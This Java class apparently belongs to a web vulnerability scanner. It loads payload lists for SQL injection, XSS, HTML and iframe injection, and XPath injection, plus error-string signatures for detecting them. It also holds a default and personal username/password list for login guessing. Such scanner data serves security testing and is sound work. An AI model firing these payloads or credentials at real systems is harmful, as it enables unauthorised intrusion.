/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Pay_Sig;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

/**
 *
 * @author laxba
 */
public class PaySigVuln {

    private String[] arrSigSQLin;
    private String[] arrPaySQLin;
    private String[][] userPass;
    private String[] arrPayHTMLin;
    private String[] arrPayXSS;
    private String[] arrPayIFramein;
    private String[] arrPayXMLXPathin;
    private String[] arrSigXMLXPathin;

    // Method to encode a string value using `UTF-8` encoding scheme
    public String encodeValue(String value) {
        try {
            return URLEncoder.encode(value, StandardCharsets.UTF_8.toString());
        } catch (UnsupportedEncodingException ex) {
            throw new RuntimeException(ex.getCause());
        }
    }

    // Decodes a URL encoded string using `UTF-8`
    public String decodeValue(String value) {
        try {
            return URLDecoder.decode(value, StandardCharsets.UTF_8.toString());
        } catch (UnsupportedEncodingException ex) {
            throw new RuntimeException(ex.getCause());
        }
    }

    public void loadData() {
        this.loadDataSQLinjection();
        this.loadDataHTMLinjection();
        this.loadUserPass();
        this.loadDataIFramein();
        this.loadDataXMLXPathin();
        this.loadDataXSS();
    }

    private void loadDataSQLinjection() {
        /*List Signature SQL Injection*/
        arrSigSQLin = new String[]{"You have an error in your SQL syntax",
            "supplied argument is not a valid MySQL",
            "mysql_fetch_array() expects parameter 1 to be resource, boolean given in",
            "java.sql.SQLException: Syntax error or access violation",
            "java.sql.SQLException: Unexpected end of command",
            "PostgreSQL query failed: ERROR: parser:",
            "XPathException",
            "Warning: SimpleXMLElement::xpath():",
            "[Microsoft][ODBC SQL Server Driver]",
            "Microsoft OLE DB Provider for ODBC Drivers",
            "[Microsoft][ODBC Microsoft Access Driver]",
            "supplied argument is not a valid ldap",
            "DB2 SQL error:",
            "Interbase Injection",
            "Sybase message:",
            "Unclosed quotation mark after the character string"};


        /*List Payload SQL Injection*/
        arrPaySQLin = new String[]{
            //SQL Injection
            //            "Test",
            "'",
            "%27",
            "a'",
            "a%27",
            "a' --",
            "a%27+--",
            "a' or 1=1; --",
            "@",
            "%40",
            "a@",
            "a%40",
            "?",
            "%3f",
            "' and 1=0) union all",
            "%27+and+1%3d0)+union+all",
            "%",
            "%25",
            "%a",
            "%25a",
            "*",
            "/",
            "%2f",
            //Passive SQL Injection
            "||6",
            "%7c%7c6",
            "'||(elt(-3+5,bin(15),ord(10),hex(char(45))))",
            "%27%7c%7c(elt(-3%2b5%2cbin(15)%2cord(10)%2chex(char(45))))",
            "'||'6",
            "%27%7c%7c%276",
            "(||6)",
            "(%7c%7c6)",
            "\" or isNULL(1/0) /*",
            "%5c%22+or+isNULL(1%2f0)+%2f*",
            "; or '1'='1'",
            "%3b+or+%271%27%3d%271%27"
        };
    }

    public String[] getArrSigSQLin() {
        return arrSigSQLin;
    }

    public String[] getArrPaySQLin() {
        return arrPaySQLin;
    }

    private void loadDataHTMLinjection() {
        /*List payload-signature html injection*/
        arrPayHTMLin = new String[]{
            //<h1>Test12345</h1>
            "%3Ch1%3ETest12345%3C%2Fh1%3E",
            //<h1>Low12345</h1>
            "%3Ch1%3ELow12345%3C%2Fh1%3E"
        };
    }

    public String[] getArrPayHTMLin() {
        return arrPayHTMLin;
    }

    public void setArrPayHTMLin(String[] arrPayHTMLin) {
        this.arrPayHTMLin = arrPayHTMLin;
    }

    private void loadUserPass() {
        userPass = new String[][]{
            {"admin", "password"},
            {"bee", "bug"},
            {"test", "test"},
            {"laxbaortrung", "vangta0fa"}
        };
    }

    public String[][] getUserPass() {
        return userPass;
    }

    public void setUserPass(String[][] userPass) {
        this.userPass = userPass;
    }

    private void loadDataXSS() {
        arrPayXSS = new String[]{
            "%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E",
            "%3CScRipT%3Ealert%28%22XSS%22%29%3B%3C%2FScRipT%3E",
            "%3Cscript%3Ealert%28123%29%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%22hellox+worldss%22%29%3B%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E+",
            "+%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E+",
            "%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%2FXSS%22%29%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E",
            "%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "%27%3B+alert%281%29%3B",};
    }

    public String[] getArrPayXSS() {
        return arrPayXSS;
    }

    public void setArrPayXSS(String[] arrPayXSS) {
        this.arrPayXSS = arrPayXSS;
    }

    private void loadDataIFramein() {
        arrPayIFramein = new String[]{
            "%3Ciframe%3E%3Ch1%3ETest12345%3C%2Fh1%3E%3C%2Fiframe%3E",
            "%22%3E%3Ciframe%3E%3Ch1%3ELow%3C%2Fh1%3E%3C%2Fiframe%3E"};
    }

    public String[] getArrPayIFramein() {
        return arrPayIFramein;
    }

    public void setArrPayIFramein(String[] arrPayIFramein) {
        this.arrPayIFramein = arrPayIFramein;
    }

    private void loadDataXMLXPathin() {
        arrPayXMLXPathin = new String[]{
            "'",
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "/",
            "//",
            "//*",
            "*/*",
            "@*",
            "count(/child::node())",
            "x' or name()='username' or 'x'='y",
            "' and count(/*)=1 and '1'='1",
            "' and count(/@*)=1 and '1'='1",
            "' and count(/comment())=1 and '1'='1",
            "1][1",
            "last()-1 and 1=2",
            "Bible\" and lower-case('A') = \"a",
            "')]password | a[contains(a,'",
            "') or contains(genre, '",
            "') or not(contains(genre, 'praveen') and '1'='2"};

        arrSigXMLXPathin = new String[]{
            "SimpleXMLElement::xpath()",
            "Invalid predicate in",
            "xmlXPathEval: evaluation failed in"};
    }

    public String[] getArrPayXMLXPathin() {
        return arrPayXMLXPathin;
    }

    public void setArrPayXMLXPathin(String[] arrPayXMLXPathin) {
        this.arrPayXMLXPathin = arrPayXMLXPathin;
    }

    public String[] getArrSigXMLXPathin() {
        return arrSigXMLXPathin;
    }

    public void setArrSigXMLXPathin(String[] arrSigXMLXPathin) {
        this.arrSigXMLXPathin = arrSigXMLXPathin;
    }
    
    
}
